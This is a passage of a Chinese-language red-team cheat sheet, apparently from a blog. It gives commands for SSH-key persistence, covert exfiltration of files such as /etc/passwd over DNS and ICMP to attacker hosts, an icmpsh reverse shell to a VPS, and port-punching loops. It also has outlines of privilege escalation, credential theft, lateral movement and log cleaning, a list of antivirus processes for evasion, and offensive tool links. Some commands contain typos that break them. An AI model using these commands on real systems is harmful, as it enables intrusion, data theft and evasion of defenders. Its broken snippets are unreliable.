class="line">AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL&#x2F;r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+</span><br><span class="line">ALEZYwqxHPNYS&#x2F;kZ4Vdv...&quot; &gt; authorized_keys</span><br><span class="line">私钥登录:</span><br><span class="line">ssh -i nameOfMykey kim@192.168.1.103</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>awk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在使用awk进行下载文件时,首先使用以上列出的任意一条命令启动一个HTTP Server</span><br><span class="line">awk &#39;BEGIN&#123;</span><br><span class="line">RS &#x3D; ORS &#x3D; &quot;\r\n&quot;</span><br><span class="line">HTTPCon &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;127.0.0.1&#x2F;1337&quot;</span><br><span class="line">print &quot;GET &#x2F;secret.txt HTTP&#x2F;1.1\r\nConnection: close\r\n&quot;</span><br><span class="line">|&amp; HTTPCon</span><br><span class="line">while (HTTPCon |&amp; getline &gt; 0)</span><br><span class="line">print $0</span><br><span class="line">close(HTTPCon)</span><br><span class="line">&#125;&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Ping</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.发送端:</span><br><span class="line">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; dome</span><br><span class="line">2.接收端</span><br><span class="line">以下代码保存到 ping_receiver.py</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">print(&quot;Scapy not found,please install scapy: pip install scapy&quot;)</span><br><span class="line">sys.exit(0)</span><br><span class="line">def process_packet(pkt):</span><br><span class="line">if pkt.haslayer(ICMP):</span><br><span class="line">if pkt[ICMP].type &#x3D; 8:</span><br><span class="line">data &#x3D; pkt[ICMP].load[-4:]</span><br><span class="line">print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125; , flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;)</span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;,prn&#x3D;process_packet)</span><br><span class="line">执行方法:</span><br><span class="line">python3 ping_receiver.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.发送端:xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short _tries&#x3D;1</span><br><span class="line">$line.gooogle.com; done</span><br><span class="line">2.接收端:</span><br><span class="line">以下代码使用了 python 的 scapy 模块,需要手动安装</span><br><span class="line">代码保存到 dns_reciver.py 文件中</span><br><span class="line">try:</span><br><span class="line">from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">print(&quot;Scapy not found,please install scapy: pip install scapy&quot;)</span><br><span class="line">def process_packet(pkt):</span><br><span class="line">if pkt.haslayer(DNS):</span><br><span class="line">domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)</span><br><span class="line">root_domain &#x3D; domain.split(&#39;.&#39;)[1]</span><br><span class="line">if root_domain.startswith(&#39;gooogle&#39;):</span><br><span class="line">print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-</span><br><span class="line">8&quot;)&#125;&#39;,flush&#x3D;True,end&#x3D;&#39;&#39;)</span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;,prn&#x3D;process_packet)</span><br><span class="line">运行方法:</span><br><span class="line">python3 dns_reciver.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Windows快速打包"><a href="#Windows快速打包" class="headerlink" title="Windows快速打包"></a>Windows快速打包</h4><p>7z</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-r 递归压缩</span><br><span class="line">-o 指定要输出到的目录</span><br><span class="line">-p 指定密码</span><br><span class="line">-v 分卷压缩,给的务必要适量,否则文件会非常多</span><br><span class="line">a 添加压缩文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>普通压缩解压方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-</span><br><span class="line">rce\*.*</span><br><span class="line"># 7z.exe x -padmin drupal754.7z.001 -oc:\xl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分卷压缩解压方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-</span><br><span class="line">rce\*.*</span><br><span class="line"># 7z.exe x -padmin drupal754.7z.001 -oc:\xl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rar</p><h4 id="Linux文件下载"><a href="#Linux文件下载" class="headerlink" title="Linux文件下载"></a>Linux文件下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">wget</span><br><span class="line">curl</span><br><span class="line">nc</span><br><span class="line">scp</span><br><span class="line">PHP等脚本语言</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows Privilege EXP</span><br><span class="line">AD特性提权</span><br><span class="line">Windows非Exp提权</span><br><span class="line">Bypass Uac</span><br><span class="line">Bypass Applocker</span><br><span class="line">Linux 提权</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Windows-Privilege-Exp"><a href="#Windows-Privilege-Exp" class="headerlink" title="Windows Privilege Exp"></a>Windows Privilege Exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MS15-051</span><br><span class="line">MS16-032</span><br><span class="line">MS16-135</span><br><span class="line">Windows-Exploit-Suggester</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="AD特性提权"><a href="#AD特性提权" class="headerlink" title="AD特性提权"></a>AD特性提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPP</span><br><span class="line">MS14-068</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Windows-非-Exp-提权"><a href="#Windows-非-Exp-提权" class="headerlink" title="Windows 非 Exp 提权"></a>Windows 非 Exp 提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DLL劫持类提权</span><br><span class="line">Unquoted Service Paths(模糊路径可控提权)</span><br><span class="line">服务路径可控提权(icacls、accesschk)</span><br><span class="line">MSI提权</span><br><span class="line">第三方服务提权</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EXP提权(DirtyCow)劫持类提权(sh、环境变量、)</span><br><span class="line">SUID</span><br><span class="line">服务提权(mysql,sudo,udev,python)</span><br><span class="line">sudo</span><br><span class="line">文件泄露(.bash_history、ssh私钥)</span><br><span class="line">shadow</span><br><span class="line">命令行受限</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Credential"><a href="#Credential" class="headerlink" title="Credential"></a>Credential</h4><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">workGroup 横向</span><br><span class="line">IPC + 计划任务</span><br><span class="line">PTH or PTT ( Psexec、WMI)</span><br><span class="line">WinRM</span><br><span class="line">内网服务: ftp&#x2F;redis&#x2F;mysql&#x2F;ssh&#x2F;mongodb</span><br><span class="line">MS17-010</span><br><span class="line">NTLM Relay</span><br><span class="line">弱口令 !!!(一个好的字典非常重要)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Credential-1"><a href="#Credential-1" class="headerlink" title="Credential"></a>Credential</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、 SAM or NTDS.DIT</span><br><span class="line">2、 在线 or 离线</span><br><span class="line">3、 键盘记录</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注册表类型</span><br><span class="line">利用系统自带软件</span><br><span class="line">Rdp</span><br><span class="line">Web</span><br><span class="line">Kerberos特性</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Clean-Log"><a href="#Clean-Log" class="headerlink" title="Clean Log"></a>Clean Log</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System Log</span><br><span class="line">Session</span><br><span class="line">进程</span><br><span class="line">二进制文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常用工具:</span><br><span class="line">信息收集:Netsess.exe、Powerview、Bloodhound</span><br><span class="line">权限提升:Powerup、UACME</span><br><span class="line">口令爆破:Hydra、Hashcat</span><br><span class="line">漏洞扫描:AWVS、Nessus、Nmap</span><br><span class="line">凭据窃取:Mimikatz、Procdump、</span><br><span class="line">MIMT:Responder.py、Impacket、Invoke-Inveigh.ps1、Cain</span><br><span class="line">Bypass Av:Invoke-Obfuscation</span><br><span class="line">后渗透框架:CobaIt Strike、Empire、Metasploit、Powersploit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="杀毒软件的进程"><a href="#杀毒软件的进程" class="headerlink" title="杀毒软件的进程"></a>杀毒软件的进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">360tray.exe 360实时保护</span><br><span class="line">ZhuDongFangYu.exe 360主动防御</span><br><span class="line">KSafeTray.exe 金山卫士</span><br><span class="line">McAfee McShield.exe 麦咖啡</span><br><span class="line">SafeDogUpdateCenter.exe 服务器安全狗</span><br><span class="line">WRSA.exe Webroot杀软</span><br><span class="line">MsMpeng.exe 微软反病毒 属于 Windows Defender 自动保护服务的核心进程</span><br><span class="line">avguard.exe AntiVir(小红伞)个人版网络安全套装</span><br><span class="line">360sd.exe &quot;360杀毒</span><br><span class="line">a2guard.exe a-squared杀毒</span><br><span class="line">ad-watch.exe Lavasoft杀毒</span><br><span class="line">cleaner8.exe The Cleaner杀毒</span><br><span class="line">vba32lder.exe vb32杀毒</span><br><span class="line">MongoosaGUI.exe Mongoosa杀毒</span><br><span class="line">CorantiControlCenter32.exe Coranti2012杀毒</span><br><span class="line">F-PROT.EXE F-PROT杀毒</span><br><span class="line">CMCTrayIcon.exe CMC杀毒</span><br><span class="line">K7TSecurity.exe K7杀毒</span><br><span class="line">UnThreat.exe UnThreat杀毒</span><br><span class="line">CKSoftShiedAntivirus4.exe Shield Antivirus杀毒</span><br><span class="line">AVWatchService.exe VIRUSfighter杀毒</span><br><span class="line">ArcaTasksService.exe ArcaVir杀毒</span><br><span class="line">iptray.exe Immunet杀毒</span><br><span class="line">PSafeSysTray.exe PSafe杀毒</span><br><span class="line">nspupsvc.exe nProtect杀毒</span><br><span class="line">SpywareTerminatorShield.exe SpywareTerminator杀毒</span><br><span class="line">BKavService.exe Bkav杀毒</span><br><span class="line">MsMpEng.exe Microsoft Security Essentials</span><br><span class="line">SBAMSvc.exe VIPRE</span><br><span class="line">ccSvcHst.exe Norton杀毒</span><br><span class="line">QQ.exe QQ</span><br><span class="line">f-secure.exe 冰岛</span><br><span class="line">avp.exe 卡巴斯基</span><br><span class="line">KvMonXP.exe 江民杀毒RavMonD.exe 瑞星杀毒</span><br><span class="line">Mcshield.exe &quot;麦咖啡</span><br><span class="line">egui.exe &quot;NOD32</span><br><span class="line">kxetray.exe 金山毒霸</span><br><span class="line">knsdtray.exe &quot;可牛杀毒</span><br><span class="line">TMBMSRV.exe 趋势杀毒</span><br><span class="line">avcenter.exe &quot;Avira(小红伞)</span><br><span class="line">ashDisp.exe Avast网络安全</span><br><span class="line">rtvscan.exe 诺顿杀毒</span><br><span class="line">ksafe.exe &quot;金山卫士</span><br><span class="line">QQPCRTP.exe QQ电脑管家</span><br><span class="line">Miner.exe 流量矿石</span><br><span class="line">AYAgent.aye 韩国胶囊</span><br><span class="line">patray.exe 安博士</span><br><span class="line">V3Svc.exe 安博士V3</span><br><span class="line">avgwdsvc.exe AVG杀毒</span><br><span class="line">ccSetMgr.exe 赛门铁克</span><br><span class="line">QUHLPSVC.EXE QUICK HEAL杀毒</span><br><span class="line">mssecess.exe 微软杀毒</span><br><span class="line">SavProgress.exe Sophos杀毒</span><br><span class="line">fsavgui.exe F-Secure杀毒</span><br><span class="line">vsserv.exe 比特梵德</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="穿透尝试"><a href="#穿透尝试" class="headerlink" title="穿透尝试"></a>穿透尝试</h4><h5 id="一、TCP"><a href="#一、TCP" class="headerlink" title="一、TCP"></a>一、TCP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内网windows:</span><br><span class="line">FOR &#x2F;L %i IN(1,1,65535) DO (cmd &#x2F;c &quot;start &#x2F;b telnet 151.73.147 %i&quot;) 自动telnet所</span><br><span class="line">有端口</span><br><span class="line">外网vps tcpdump</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="二、UDP"><a href="#二、UDP" class="headerlink" title="二、UDP"></a>二、UDP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;L %i IN(1,1,65535) DO (cmd &#x2F;c &quot;srart &#x2F;b nslookup -port&#x3D;%i rcoil.me</span><br><span class="line">151.101.73.147&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="三、ICMP"><a href="#三、ICMP" class="headerlink" title="三、ICMP"></a>三、ICMP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vps:</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git</span><br><span class="line">apt-get install python-impacket</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line">python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207</span><br><span class="line">内网 windows:</span><br><span class="line">icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查询代理:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_USERS\S-1-5-21-1563011143-1171140764-1273336227-</span><br><span class="line">500\Software\Microsoft\Winods\CurrentVersion\Internet Settings&quot; &#x2F;v ProxyServer</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet</span><br><span class="line">Settings&quot;</span><br><span class="line">reg query &quot;HKEY_USERS\S-1-5-21-1563011143-1171140764-1273336227-</span><br><span class="line">500\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; &#x2F;v</span><br><span class="line">AutoConfigURL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理测试:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">&#x2F;&#x2F;不通</span><br><span class="line">curl -x proxy-ip:8080 www.baidu.com</span><br><span class="line">tcp协议</span><br><span class="line">外网vps : nc –lvp port</span><br><span class="line">内网机器:nc ip port</span><br><span class="line">dns协议</span><br><span class="line">外网vps: nc –u –lvp 53</span><br><span class="line">内网机器:</span><br><span class="line">windows: nslookup www.baidu.com vps-ip</span><br><span class="line">linux:dig @vps-ip www.baidu.com</span><br><span class="line">http协议</span><br><span class="line">外网vps : nc –lvp 80 (or 8080等)</span><br><span class="line">内网机器 : curl vps-ip:8080</span><br><span class="line">icmp协议</span><br><span class="line">外网vps:抓包、tcpdump icmp</span><br><span class="line">内网机器:直接ping</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="工具集成"><a href="#工具集成" class="headerlink" title="工具集成"></a>工具集成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">HW</span><br><span class="line">基础配置</span><br><span class="line">浏览器</span><br><span class="line">chrome</span><br><span class="line">firefox</span><br><span class="line">数据库管理</span><br><span class="line">&#x2F;&#x2F;通Navicat Premium、DBeaver</span><br><span class="line">数据库驱动</span><br><span class="line">OGDBC</span><br><span class="line">文本编辑工具</span><br><span class="line">notepad++、notepad-mod、sublime、</span><br><span class="line">vscode - https:&#x2F;&#x2F;code.visualstudio.com&#x2F;Download</span><br><span class="line">办公软件</span><br><span class="line">office系列、WPS</span><br><span class="line">解压缩工具</span><br><span class="line">WinRAR -http:&#x2F;&#x2F;www.winrar.com.cn&#x2F;</span><br><span class="line">Bandzip -http:&#x2F;&#x2F;www.bandisoft.com&#x2F;</span><br><span class="line">7zip - https:&#x2F;&#x2F;www.7-zip.org&#x2F;</span><br><span class="line">磁盘索引</span><br><span class="line">everything -https:&#x2F;&#x2F;www.voidtools.com&#x2F;zh-cn&#x2F;downloads&#x2F;</span><br><span class="line">光盘搜素 -</span><br><span class="line">类Alfred效率工具</span><br><span class="line">Wox、Utools、Keypirinha</span><br><span class="line">虚拟机</span><br><span class="line">Vmware、</span><br><span class="line">VirtualBox-https:&#x2F;&#x2F;www.virtualbox.org&#x2F;wiki&#x2F;Downloads</span><br><span class="line">网络分析</span><br><span class="line">Wireshark、Fiddler、Charles</span><br><span class="line">SSH管理</span><br><span class="line">Xshell、SecureCRT、Putty、BitVise SSH Client</span><br><span class="line">IDE</span><br><span class="line">Jetbrains Idea、Jetbrains Pycharm、 Visual Studio</span><br><span class="line">反汇编工具</span><br><span class="line">dnSpy、ILSpy、JD-GUI、Luyten</span><br><span class="line">运行时环境</span><br><span class="line">jdk、jre(推荐1.8)python2、</span><br><span class="line">python3- https:&#x2F;&#x2F;www.python.org&#x2F;downloads&#x2F;</span><br><span class="line">net framework</span><br><span class="line">外网打点常用的工具</span><br><span class="line">通用工具Burp Suite</span><br><span class="line">SOAP 测试工具</span><br><span class="line">SoapUI、WSAttacker</span><br><span class="line">子域名发现</span><br><span class="line">Layer.exe</span><br><span class="line">subDomainsBrute - http:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;subDomainsBrute</span><br><span class="line">目录扫描</span><br><span class="line">御剑</span><br><span class="line">dirsearch - https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch</span><br><span class="line">端口扫描</span><br><span class="line">nmap - https:&#x2F;&#x2F;nmap.org&#x2F;</span><br><span class="line">masscan - https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br><span class="line">SQL注入工具</span><br><span class="line">sqlmap - https:&#x2F;&#x2F;github.com&#x2F;sqlmapproject&#x2F;sqlmap</span><br><span class="line">源代码泄露利用工具</span><br><span class="line">git泄露 - https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;GitHack</span><br><span class="line">svn泄露 - https:&#x2F;&#x2F;github.com&#x2F;callmefeifei&#x2F;SvnHack</span><br><span class="line">常见java漏洞利用工具,</span><br><span class="line">struts2、weblogic、jboss、spring boot、fastjson、shiro等</span><br><span class="line">WebShell管理工具</span><br><span class="line">菜刀、冰蝎、蚁剑</span><br><span class="line">Web扫描器</span><br><span class="line">Awvs漏洞扫描器</span><br><span class="line">内网渗透常用工具</span><br><span class="line">Cobalt strike</span><br><span class="line">代理通道类</span><br><span class="line">reGeorg - http:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg</span><br><span class="line">htran</span><br><span class="line">frp - https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp</span><br><span class="line">earthworm - http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm&#x2F;</span><br><span class="line">proxifier</span><br><span class="line">ScoksCap32</span><br><span class="line">内网机器信息收集</span><br><span class="line">包含本机的信息收集本机凭证收集</span><br><span class="line">Lazagne - https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagne</span><br><span class="line">Mimikatz - https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br><span class="line">wce - https:&#x2F;&#x2F;github.com&#x2F;xymnal&#x2F;wce</span><br><span class="line">内网常见横向移动工具或命令</span><br><span class="line">nbtscan at、 schtasks、psexec、wmic、wmiexec.vbs、winrs</span><br><span class="line">MS17-010 - https:&#x2F;&#x2F;github.com&#x2F;worawit&#x2F;MS17-010</span><br><span class="line">cve_2019_0708 - https:&#x2F;&#x2F;github.com&#x2F;r00t-3xp10it&#x2F;msf-auxiliarys</span><br><span class="line">Responder - https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;Responder</span><br><span class="line">内网弱口令扫描</span><br><span class="line">超级弱口令检查工具 - https:&#x2F;&#x2F;github.com&#x2F;shack2&#x2F;SNETCracker</span><br><span class="line">ncrack - https:&#x2F;&#x2F;nmap.org&#x2F;ncrack&#x2F;</span><br><span class="line">系统提权</span><br><span class="line">windows提权 - https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits</span><br><span class="line">linux提权 - https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;linux-kernel-exploits</span><br><span class="line">静态编译工具集</span><br><span class="line">常用工具的单文件 - https:&#x2F;&#x2F;github.com&#x2F;andrew-d&#x2F;static-binaries</span><br><span class="line">针对端口服务的利用工具</span><br><span class="line">端口 服务 工具</span><br><span class="line">1433 mssql(sql server) 